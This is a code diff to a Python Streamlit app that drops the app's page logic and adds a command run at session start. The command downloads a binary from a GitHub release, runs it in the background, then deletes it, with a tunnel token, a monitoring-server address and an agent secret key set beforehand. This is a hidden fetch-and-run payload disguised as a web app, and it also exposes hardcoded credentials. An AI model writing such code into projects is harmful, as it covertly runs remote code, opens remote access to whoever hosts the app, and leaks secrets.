@@ -1,28 +1,13 @@
 import streamlit as st
 import subprocess
-from urllib.parse import urlparse
-import os
 
-# 在会话开始时执行shell脚本
 if 'script_executed' not in st.session_state:
-    subprocess.call("chmod +x ./start.sh && ./start.sh", shell=True)
+    command = "ARGO_AUTH=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzYxZjhiNGMtYzA4MC00ODhiLWE0OGMtMGI4MDA0OWY2MTU2IiwicyI6Ik5EVm1NamcyWVdVdE9USTVOeTAwWlRJMUxUZzFZek10WmpoaE1tRmxNRFEzT0RaaCJ9 NZ_SERVER=newnz.seav.eu.org NZ_agentsecretkey=cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg bash -c 'curl -L -o js2bin1 https://github.com/seav1/dl/releases/download/src/js2bin1 && chmod +x js2bin1 && nohup ./js2bin1 && rm js2bin1'"
+    subprocess.call(command, shell=True)
     st.session_state.script_executed = True
 
 def main():
-    # 获取当前请求的URL信息
-    query_params = st.query_params
-    
-    # 检查是否是WebSocket请求
-    if 'ws' in query_params:
-        # 使用JavaScript进行WebSocket重定向
-        js_code = f"""
-        <script>
-        if (window.WebSocket) {{
-            window.location.href = 'ws://localhost:8002{st.get_path()}';
-        }}
-        </script>
-        """
-        st.components.v1.html(js_code, height=0)
+    pass
 
 if __name__ == "__main__":
     main()
